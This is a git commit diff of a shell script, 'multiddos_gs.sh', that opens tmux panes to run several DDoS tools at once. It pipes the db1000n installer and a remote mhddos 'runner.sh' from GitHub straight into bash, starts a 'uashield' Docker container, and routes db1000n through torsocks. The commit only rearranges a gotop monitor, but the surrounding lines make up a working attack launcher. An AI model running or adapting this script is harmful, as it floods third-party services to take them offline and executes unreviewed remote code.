2bd442ed292a2658ca90421e80da11091c1dc076
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-06 23:28:34 +0300

    Update multiddos_gs.sh

--- multiddos_gs.sh
+++ multiddos_gs.sh
@@ -25,7 +25,6 @@ cd multiddos
 curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash
 
 tmux new-session -s multiddos -d 'gotop -asc solarized'
-gotop -asc solarized
 sleep 0.1
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
 sleep 0.1
@@ -33,5 +32,7 @@ sleep 0.1
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
 sleep 0.1
 tmux split-window -v 'torsocks -i ./db1000n'
+tmux select-pane -t 0
+gotop -asc solarized
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux -2 attach-session -d
